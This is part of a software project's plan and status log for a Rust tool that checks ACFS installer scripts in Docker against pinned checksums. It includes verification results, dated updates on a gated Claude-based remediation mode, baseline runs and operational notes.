**Target state:** `validate` and `check` enforce `https://` like ACFS's `enforce_https`; `file://` requires
`--allow-file-urls` (set automatically by the test harness) and is reported in the run header; `http://` is
an error with the installer name.
**Success criteria:** CLI tests for each scheme.
**Dependencies:** C5. **Complexity:** S. **Vision goals served:** 2, 13.

#### Gap A11: ACFS PR gate — NOT_STARTED → WORKING

**Current state:** ACFS's own canary tests the full installer nightly; nothing checks a `checksums.yaml`
change before it merges.
**Target state:** `check --acfs-ref <git-ref>` and `validate --acfs-ref` fetch the ref into a temp worktree
of the configured ACFS repo and use its `checksums.yaml`; a reusable workflow
(`.github/workflows/acfs-pr-gate.yml` with `workflow_call` inputs `acfs_repo`, `ref`, `installers`) runs
`validate --check-hashes` and `check` for the installers whose entries changed in the diff and posts a
markdown summary; ACFS's CI can call it on pull requests that touch `checksums.yaml` or `security.sh`.
**Success criteria:** CLI test with a temp git repo and two refs; a manual `workflow_dispatch` against an
ACFS branch produces the summary.
**Dependencies:** C11, M9. **Complexity:** M. **Vision goals served:** 12, 13.

#### Gap A12: Notification digest and change-only mode — PARTIAL → WORKING

**Current state:** notifications fire per run.
**Target state:** `notifications.mode = every_run | on_change | daily_digest`; `on_change` (default) sends
only when the set of failing installers or drifted checksums changed versus the previous run (uses A8 diffs);
`daily_digest` accumulates and sends once per day via the `notify --digest` subcommand (systemd timer or the
canary). The canary issue uses `on_change` so it comments only on transitions.
**Success criteria:** wiremock tests for each mode with two consecutive runs.
**Dependencies:** M5, A8. **Complexity:** S. **Vision goals served:** 15.

#### Gap A13: Reproducibility fields and schema versioning — PARTIAL → WORKING

**Current state:** results do not record the image id or the script hash actually executed; output schemas
have no version.
**Target state:** the run header gains `schema_version`, `image_id` (Docker image id, not just the tag),
`environment` (abridged doctor output, A3); each result records `script_sha256` executed and
`installed_version` (A2); JSON/JSONL consumers can rely on `schema_version` and a documented compatibility
policy (additive changes only within a major).
**Success criteria:** unit test that `schema_version` is present in every output kind; docs section.
**Dependencies:** C4, A3. **Complexity:** S. **Vision goals served:** 7, 8.

### 4.10 Ambition round 2: harmonization, ordering, and where the math earns its place

Round 2 reviewed rounds 0 and 1 together and made these changes (already reflected above and in the beads):

1. **Deterministic first, model second.** C12a (checksum refresh) plus A1 (diff and risk score) resolve the
   majority of real failures with no LLM and produce reviewable evidence. C12b advisory consumes A1's risk
   report in its prompt so Claude explains a suspicious diff instead of re-deriving it. C12c stays P3.
2. **One history model feeds five features.** A8's run history (from C4 result files) powers longest-first
   scheduling (A7), change-only notifications (A12), the canary issue text (C11), the baseline diff (C10b),
   and flakiness detection. Build A8 right after C4, before those consumers.
3. **Bollard over the docker CLI.** M3 uses Bollard's build API so the tool depends on the socket only; the
   `docker` binary becomes optional (doctor reports it).
4. **Two locks, not one.** A5's run lock protects the data dir; the image-build lock is separate so `serve`
   and `doctor` never block on a running check.
5. **Detector choice.** For flakiness and change-points the plan uses a Beta-Binomial posterior and a CUSUM,
   not a learned model: a nightly series has tens of points, the statistics are explainable in one sentence
   inside a GitHub issue, and both are deterministic and unit-testable. Diff risk scoring likewise uses
   named features plus Shannon entropy of added lines; the features are the explanation.
6. **Split M10.** The smoke-test fix lands in wave 0 (`M10a`); the blocking Docker and CLI jobs land with the
   suites (`M10b`).
7. **Every implementation bead has a companion test bead or inline test criteria; the FINAL bead re-runs
   section 4.6 plus the A-series criteria.**

Updated counts: 14 critical, 14 major, 9 minor, 13 ambition (50 gaps). Updated waves:

| Wave | Beads |
|------|-------|
| 0 | C14a, M10a, m6 |
| 1 | C1, C2, C3, C4, C5, C7, M4, m9, A10 |
| 2 | C6, M2, M1, M3, M9, M14, m1, m2, m3, A5, A6, A13, A8 |
| 3 | C8a-d, C9, M8a-b, M11, C10a-b, A2, A4, A9 |
| 4 | M5, M6, M7, C13a-b, m8, A3, A7, A12 |
| 5 | C12a, C12d, C12b, A1, C12e, (C12c P3) |
| 6 | C11, A11, M12, M13, m7, C14b, m4, M10b, FINAL |

## 5. Next step

Phase 3a is done for sections 4.2 to 4.6 (66 beads under epic `automated_flywheel_setup_checker-jmu`);
the round-1 additions (A1 to A13) and the round-2 split (M10a/M10b) are added as beads next, then 4 to 5
plan-space refinement rounds over every bead (frozen refinement prompt), then `bv --robot-triage`, then
implementation starting at wave 0.

## Status update 2026-09-02 (end of implementation session)

Every bead from waves 0–4 and the remediation redesign (wave 5) is implemented, tested and
pushed; the Rust suite is green on every target (lib 162, CLI 60, unit 268, e2e 46, acfs_drift 3)
with clippy clean, the bash E2E scripts drive the real binary (18 scripts), and the Docker loop was
proven end to end on this host with the release binary (prepared image built, zoxide passed as the
non-root user with its version captured, uv refused for genuine upstream checksum drift without
executing).

### Verification plan (section 4.6) — results

| # | Goal | Evidence | Status |
|---|------|----------|--------|
| 1 | Docker isolation, any base, non-root | local proof run (afsc-user, prepared image); Docker suite on hz4: image derivation for ubuntu:24.04, caching, non-root alias, run_as_root (a real bug: the prepared image's USER overrode `run_as_root` — fixed) | proven |
| 2 | Checksum gate | `checksum_mismatch.sh` (exit 99, never executed); 12 real upstream drifts refused in the full baseline; Docker suite `real_run_verifies_checksum_and_refuses_mismatch` green | proven |
| 3 | Classification | CLI category tests, `error_classification.sh`, golden corpus (20 cases, 5 gaps found and fixed) | proven |
| 4 | Parallel | `check_runs_in_parallel_from_config`, `parallel_execution.sh` | proven |
| 5 | Retry | flaky-fixture attempts with waits; `network_failure.sh` | proven |
| 6 | Remediation | `tests/cli/remediate.rs`: advisory diff + verification, propose branch, `--from-last-run`, fake-claude success/unsafe/error/rate-limit/unavailable; `check --remediate` outcomes | proven (Claude propose/apply deferred, C12c) |
| 7 | JSON/JSONL purity | stdout-purity tests with `-vvv`; `jsonl_output.sh` | proven |
| 8 | Persistence/status | same-second runs, `--run`, retention, history/diff | proven |
| 9, 10 | Monitoring | `tests/cli/serve.rs`: per-installer gauges, stale 503, deterministic prometheus | proven |
| 11, 12 | systemd | templates parse via clap, `install-systemd.sh --dry-run` test, `systemd_integration.sh`; manual `systemctl start` on a host not performed (needs sudo) | partial (manual step only) |
| 13 | Validation | cross-check, `--profile`, exit 4, file:// hashes, drift persisted | proven |
| 14 | Config | precedence matrix, `config show --resolved`, `config_override.sh` | proven |
| 15 | Notifications | wiremock create → comment → close, modes, digest, secret hygiene | proven |
| 16 | list | spec-aware, `--runnable`, no dead flags | proven |
| 17 | Docs | README subcommand + config-section drift tests, CHANGELOG test | proven |
| 18 | CI/release | workflows written (ci with a stable job, e2e-tests with host Docker, nightly canary, PR gate, tag-driven release with `cargo install --git` smoke); GitHub runs not observable from this host; first tag is the owner's call | partial (GitHub-side only) |
| 19 | Tests | CLI suite 60 tests; Docker suite 9/9 (local daemon, binary built on a worker); bash suite drives the binary; classifier corpus | proven |
| 20 | Fidelity | doctor cross-check 0 drift against the real ACFS checkout; drift tests wired in CI; full 48-installer baseline run on this host (`docs/baseline/2026-09-02.md`: 35 passed, 12 refused for upstream checksum drift, 1 real failure — fsfs ships a binary needing glibc 2.38+ which ubuntu:22.04 lacks); `remediate checksums` re-hashed and container-verified the drifted pins | proven |
| 21 | Lifecycle | SIGTERM test (exit 143, cancelled results), Docker suite cancellation/timeout/reaper tests, no `afsc.managed` containers left after the suite or the full baseline | proven |
| 22 | Infra UX | `DOCKER_HOST=unix:///nope` exits 3 with the documented message | proven |

### Still open

- Cutting the first `v0.1.0` tag: `dsr version tag`, `dsr build`, `dsr release` on the release operator's machine.

Update 2026-09-03 02:30 UTC: the owner ruled that GitHub Actions is never used, so every "CI"
item above is superseded by dsr. Actions is disabled on the repository, the badges and CI passages
are gone from the README, `.dsr/repos.yaml` carries the quality-gate recipe (fmt, clippy with
`-D warnings`, full tests, Docker suite, bash E2E) and `.dsr/repos.d/` the build authority for
four targets; `dsr repos validate` passes and `dsr build --dry-run` plans v0.1.0. The workflow
files under `.github/` are inert until the owner gives the deletion command.

Update 2026-09-03 00:50 UTC: `C12c` is implemented and proven. `[remediation].mode = propose|apply`
runs a Claude edit session in a git worktree of the ACFS checkout (`--permission-mode acceptEdits`,
edit tools limited to the worktree, Bash only with `allow_bash`), then applies three gates before
anything is committed: no High/Critical command in the transcript, every changed path inside the
edit policy (`checksums.yaml`, the `KNOWN_INSTALLERS` block, `scripts/generated/`), and a re-run of
the installer against the worktree; a rejected session leaves no worktree or branch. Fake-claude
scenarios and a fake `gh` cover the branch/PR, rejection and push paths (CLI suite 64). With the
real `claude` CLI (2.1.259) against the real checkout, a propose session on fsfs investigated and
made no changes ("cannot be fixed within the allowed files, and the pin is already correct"),
cost $1.27, cleanup verified. Two real-CLI facts fixed along the way: a budget or turn cap comes
back as exit 1 with an `is_error` envelope (`result: null`) and nothing on stderr, which used to
surface as an empty error after three blind retries; and one invocation costs about $0.13 before
it reads anything, so the default `cost_limit_usd` is now 3.0.

Update 2026-09-03 01:45 UTC, live proofs of paths that had only fixture coverage: (1) the checker
ran as a transient `Type=notify` user unit with `WatchdogSec=60` and sent READY plus watchdog
pings before exiting with the run's own status; (2) a second full 24.04 baseline (44 of 48, 279 s
at parallel 3) gave real history: `status --history` shows the Beta pass-probability per
installer, `status --diff` reports `mcp_agent_mail` recovered after the minisign fix, and the
markdown report renders both runs. Advisory runs now use `--permission-mode default` (plan mode
made the CLI waste turns on a plan file it could not write; $1.00 became $0.23 for the same
question) and session branches carry a random suffix after two sessions in one second collided.
- Findings from the full baseline worth acting on in ACFS: 12 pins drifted upstream (atuin, bv, caam, casr, cass, ee, grok, mcp_agent_mail, pi, rust, ubs, uv); the ACFS checkout regenerated its checksums later on 2026-09-02, leaving cass and ubs, and the tool's propose mode created branch `afsc/checksum-refresh-20260902-213449` (ubs pin, verified) for the owner to push.

Update 2026-09-02 22:00 UTC: `C14b` is closed (bollard 0.21, reqwest 0.13, similar 3; Docker suite 9/9 and the
bash Docker scenarios pass on the migrated binary). The fsfs finding turned out to be a checker default, not an
ACFS bug: ACFS targets Ubuntu 24.04+, and on `ubuntu:22.04` (glibc 2.35) the prebuilt cass and fsfs binaries are
refused, so their installers start source builds that exceed the timeout. The config default was already 24.04
but the README example and `docker/Dockerfile.base` said 22.04; all three now agree on 24.04, cass verifies in
7 s there, and the 24.04 baseline is in `docs/baseline/2026-09-02-ubuntu2404.md` (43 of 48 pass; the base
image also gained `minisign`, which ACFS installs before the mcp_agent_mail and caam installers). Two facts for
the owner: the fsfs v1.8.0 release binary needs `GLIBC_2.43`, newer than any Ubuntu LTS, and three pins (cass,
ubs, srps) drift again after the upstream checksum regeneration.

### Operational notes

- An external auto-commit process on the development host ran `git reset --hard origin/main`
  once during the session and discarded two hours of uncommitted work; it was recovered from the
  rch worker's synced tree. Commit and push after every green suite.
- The host's root disk (4–7 GiB free) is too small for the full catalog in parallel; a leaked
  container from before this work (`afsc-mdwb-20260901-…`) still holds 2.1 GB and was never
  authorized for removal.

